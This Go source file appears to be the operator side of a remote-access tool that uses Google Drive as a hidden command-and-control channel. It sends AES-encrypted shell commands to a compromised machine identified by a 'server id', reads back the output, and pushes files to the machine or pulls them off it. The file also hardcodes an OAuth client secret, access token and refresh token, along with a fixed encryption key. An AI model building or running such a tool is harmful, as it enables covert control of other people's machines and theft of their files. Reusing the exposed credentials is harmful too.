package main

import (
	//"crypto/md5"
	//"encoding/json"
	"fmt"
	"time"
	//"encoding/hex"
	//"net"
	//"bytes"
	"io/ioutil"
	"os"
	"bufio"
	"strings"

	"./toolkits"
	"./climanage"

	"golang.org/x/net/context"
	"golang.org/x/oauth2"
	"google.golang.org/api/drive/v3"
	"github.com/op/go-logging"
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"flag"
)

var key = "123456781234567812345678"

var log = logging.MustGetLogger("gclient")

var format = logging.MustStringFormatter(
	`%{color}%{time:15:04:05.000} %{shortfunc} > %{level:s} %{color:reset} %{message}`,
)

var format1 = logging.MustStringFormatter(
	`%{time:15:04:05.000} > %{message}`,
)


func loginDrive() (*drive.Service, error) {
	// login
	config := &oauth2.Config{
		ClientID:     "467276612234-emnonfe8toodl8dalufrs6sbvnd081t0.apps.googleusercontent.com",
		ClientSecret: "AAa6z2x0cACEX45YUaxrUcoK",
		RedirectURL:  "urn:ietf:wg:oauth:2.0:oob",
		Scopes:       []string{"https://www.googleapis.com/auth/drive"},
		Endpoint: oauth2.Endpoint{
			AuthURL:  "https://accounts.google.com/o/oauth2/auth",
			TokenURL: "https://accounts.google.com/o/oauth2/token",
		},
	}

	token := &oauth2.Token{
		AccessToken:"ya29.GlvWBT0hU2XFwH_2YcMbHNPPzyAWgwx7JkltB2q0WBXyco5tWfhViXJGDONtm9dcrP3ykce-WRZOILzxn88bUZn7eM4IFXOoKqJZsskElvYUL92yfWCt7xBnT4fY",
		TokenType:"Bearer",
		RefreshToken:"1/YDqr0lVvhIWzMUBjrohtPMaTEUI5PwXONxlPLvdflHEGoRZztGqQRDGsKvWfhaGE",
		Expiry: time.Now(),
	}
	client := config.Client(context.Background(), token)

	srv, err := drive.New(client)
	if err != nil {
		log.Error("Unable to retrieve Drive client: %v", err)
	}
	log.Debug("Login...")

	return srv, err
}

func sendMessage(srv *drive.Service, serverId string, clientId string,
	message string) error {
	newFile := &drive.File{
		Name: serverId+".mmd",
		MimeType: "application/octet-stream",
		//Description: time.Now().Format("2006-01-02 15:04:05"),
		AppProperties: map[string]string{
			"losi":clientId,
			"owe":"mmd",
			"ty":"a01",
		},
	}
	sendData := toolkits.AesEncrypt([]byte(message), key)
	m := bytes.NewBuffer(sendData)
	nf, err := srv.Files.Create(newFile).Media(m).Do()
	log.Debug("send message", nf.Id)

	return err
}

func sendMessageUpload(srv *drive.Service, serverId string, clientId string,
	localFilename string, remoteFilename string) error {
	newFile := &drive.File{
		Name: serverId+".mmd",
		MimeType: "application/octet-stream",
		OriginalFilename: remoteFilename,
		//Description: time.Now().Format("2006-01-02 15:04:05"),
		AppProperties: map[string]string{
			"losi":clientId,
			"owe":"mmd",
			"ty":"a02",
		},
	}

	file, err := os.Open(localFilename)
	if err != nil {
		log.Error(err)
		return err
	}
	defer file.Close()
	fileData, err := ioutil.ReadAll(file)

	sendData := toolkits.AesEncrypt(fileData, key)
	m := bytes.NewBuffer(sendData)
	nf, err := srv.Files.Create(newFile).Media(m).Do()
	log.Debug("send message", nf.Id)

	return err
}

func sendMessageDownload(srv *drive.Service, serverId string, clientId string,
	remoteFilename string) error {
	newFile := &drive.File{
		Name: serverId+".mmd",
		MimeType: "application/octet-stream",
		OriginalFilename: remoteFilename,
		//Description: time.Now().Format("2006-01-02 15:04:05"),
		AppProperties: map[string]string{
			"losi":clientId,
			"owe":"mmd",
			"ty":"a03",
		},
	}

	sendData := toolkits.AesEncrypt(nil, key)
	m := bytes.NewBuffer(sendData)
	nf, err := srv.Files.Create(newFile).Media(m).Do()
	log.Debug("send message", nf.Id)

	return err
}

func recvMessage(srv *drive.Service, serverId string)  {
	queryString := fmt.Sprintf("appProperties has { key='owe' and value='%s' }", serverId)
	r, err := srv.Files.List().Q(queryString).
		Fields("files(id, originalFilename, size, appProperties)").Do()
	if err != nil {
		log.Error("Unable to retrieve files: ", err)
	}

	for _, i := range r.Files {
		cmdType := i.AppProperties["typ"]

		fileInfo := fmt.Sprintf("%s(%d)", i.Id, i.Size)
		log.Debug("recv", fileInfo)
		// get file content
		response, err := srv.Files.Get(i.Id).Download()
		if err != nil {
			log.Error("Download error: %v", err)
			return
		}
		content, _ := ioutil.ReadAll(response.Body)
		response.Body.Close()

		// 解密
		recvData := toolkits.AesDecrypt(content, key)
		if cmdType == "a01" {
			log.Info(string(recvData))
		} else if cmdType == "a02" {

		} else if cmdType == "a03" {
			filename := strings.Replace(i.OriginalFilename, "\\", "_", -1)
			filename = strings.Replace(filename, ":", "_", -1)
			file, err := os.OpenFile(filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0666)
			if err != nil {
				log.Error(err)
			}
			file.Write(recvData)
			file.Close()
			log.Info("get", i.OriginalFilename, "success")
		} else {
			log.Info("unknow word")
		}

		// delete file
		srv.Files.Delete(i.Id).Do()
	}
}

func panic(err error)  {
	println(err)
	os.Exit(1)
}

func main() {
	// serverId
	Id := flag.String("id", "", "server id")
	configFile := flag.String("c", "", "config file name")
	flag.Parse()

	if (*Id == "") || (*configFile == "") {
		flag.PrintDefaults()
		os.Exit(0)
	}

	serverId := *Id
	//serverId := "78937ceb5b9dd7f800f3025e09449172"
	//serverId := "201cc0a4e7b594ccd147ff2e6cad9cdf"
	//serverId := "d96424639eaa24e3a4ed8049ade55e00"

	//
	serverInfo, err := climanage.SystemInfoString(serverId)
	if err != nil {
		panic(err)
	}
	println("---------", serverInfo[0], "---------")
	println(serverInfo[1])
	println(serverInfo[2])
	println(serverInfo[13])
	println("------------------------------------")

	// clientId
	clientString, _ := os.Executable()
	h := md5.New()
	h.Write([]byte(clientString))
	cipherStr := h.Sum(nil)
	clientId := hex.EncodeToString(cipherStr)

	// init log file
	logFilename := fmt.Sprintf("data\\%s\\%s.log", serverId, time.Now().Format("20060102"))
	logFile, err := os.OpenFile(logFilename, os.O_WRONLY|os.O_APPEND|os.O_CREATE,0666)
	//logFile, err := os.OpenFile(logFilename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE,0666)
	if err != nil{
		panic(err)
	}
	backend1 := logging.NewLogBackend(logFile, "", 0)
	backend1Formatter := logging.NewBackendFormatter(backend1, format1)
	backend1Leveled := logging.AddModuleLevel(backend1)
	backend1Leveled.SetLevel(logging.INFO, "")

	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format1)

	logging.SetBackend(backend1Formatter, backend2Formatter)

	// 登录Google
	log.Debug("read config from", *configFile)
	srv, err := climanage.LoginDriveFromFile(*configFile)
	if err != nil{
		panic(err)
	}
	log.Info("login OK")
	log.Debug("client id:", clientId)
	log.Debug("server id:", serverId)

	// 查询上线时间
	r, err := srv.Files.List().Q("name='"+serverId+".idx'").
		Fields("files(modifiedTime, description)").Do()
	if err != nil {
		log.Fatalf("Unable to retrieve files: %v", err)
	}
	if len(r.Files) == 0 {
		log.Info("No index file.")
	} else {
		for _, i := range r.Files {
			log.Debug("ModifiedTime:", i.ModifiedTime)
			log.Debug("ReportTime:", i.Description)
		}
	}

	// 创建一条Login命令
	newFile := &drive.File{
		Name: serverId + ".smd",
		MimeType: "application/octet-stream",
		AppProperties: map[string]string{
			"typ":	"sh",
		},
	}
	messageMedia := bytes.NewBuffer([]byte{0x03, 0x78, 0x79, 0x12})
	nf, err := srv.Files.Create(newFile).Media(messageMedia).Do()
	if err != nil {
		log.Debug("create error")
	}
	inputId := nf.Id
	outputId := ""

	// 等待命令文件
	for {
		timeout := time.NewTicker(time.Second)
		select {
		case <-timeout.C:
			//case <- abortCh:
			//	return
		}

		media, err := srv.Files.Get(inputId).Fields("id, size, description").Do()
		if err != nil {
			log.Debug("get error")
			return
		}
		log.Debug("check response")
		if media.Size == 0 {
			outputId = media.Description
			break
		}
	}
	log.Debug("connect", inputId, outputId)

	// 获取输出信息
	go func() {
		fileId := outputId

		for {
			var media *drive.File
			var err error

			// 等待命令文件
			for {
				timeout := time.NewTicker(time.Second)
				select {
				case <-timeout.C:
					//case <- abortCh:
					//	return
				}

				media, err = srv.Files.Get(fileId).Fields("id, size, description, appProperties").Do()
				if err != nil {
					log.Debug("get output pipe error")
					return
				}
				//log.Debug("check output pipe", media.Size, media.AppProperties["typ"])
				if media.Size > 0 {
					break
				}
			}

			// 读取数据
			response, err := srv.Files.Get(fileId).Download()
			if err != nil {
				log.Debug("Download error", err.Error())
				return
			}
			content, _ := ioutil.ReadAll(response.Body)
			response.Body.Close()
			recvData := toolkits.AesDecrypt(content, toolkits.MessageKey)

			if media.AppProperties["typ"] == "get" {
				// get file
				log.Debug("recv get", media.AppProperties["file"])
				filename := strings.Replace(media.AppProperties["file"], "\\", "_", -1)
				filename = strings.Replace(filename, ":", "_", -1)
				file, err := os.OpenFile(filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0666)
				if err != nil {
					log.Error(err)
				}
				file.Write(recvData)
				file.Close()
			} else {
				// 输出数据
				log.Info(string(recvData))
			}

			// 清空数据文件
			newFile := &drive.File{
				AppProperties: map[string]string{
					"typ":	"sh",
				},
			}
			messageMedia := bytes.NewBuffer(nil)
			srv.Files.Update(fileId, newFile).Media(messageMedia).Do()
		}
	}()


	// 等待用户输入
	for {
		var err error

		inputReader := bufio.NewReader(os.Stdin)
		input, _ := inputReader.ReadString('\n')
		inputString := strings.Trim(input, "\r\n")
		//log.Info(inputString)

		// 判断命令
		s := strings.Split(inputString, " ")
		if s[0] == "put" {
			var file *os.File
			var fileData []byte

			localFilename 	:= s[1]
			remoteFilename 	:= s[2]

			file, err = os.Open(localFilename)
			if err != nil {
				log.Error(err)
				continue
			}
			fileData, err = ioutil.ReadAll(file)
			file.Close()

			newFile := &drive.File{
				AppProperties: map[string]string{
					"typ":	"put",
					"file":	remoteFilename,
				},
			}

			// 加密数据
			sendData := toolkits.AesEncrypt(fileData, toolkits.MessageKey)
			messageMedia := bytes.NewBuffer(sendData)

			// 更新文件内容
			srv.Files.Update(inputId, newFile).Media(messageMedia).Do()
		} else if s[0] == "get" {
			remoteFilename := s[1]
			log.Debug("get", remoteFilename)

			newFile := &drive.File{
				AppProperties: map[string]string{
					"typ":	"get",
					"file":	remoteFilename,
				},
			}

			// 加密数据
			sendData := toolkits.AesEncrypt([]byte(remoteFilename), toolkits.MessageKey)
			messageMedia := bytes.NewBuffer(sendData)

			// 更新文件内容
			srv.Files.Update(inputId, newFile).Media(messageMedia).Do()
		} else {
			newFile := &drive.File{
				AppProperties: map[string]string{
					"typ":	"sh",
				},
			}

			// 加密数据
			sendData := toolkits.AesEncrypt([]byte(inputString+"\n"), toolkits.MessageKey)
			messageMedia := bytes.NewBuffer(sendData)

			// 更新文件内容
			srv.Files.Update(inputId, newFile).Media(messageMedia).Do()
		}
	}
}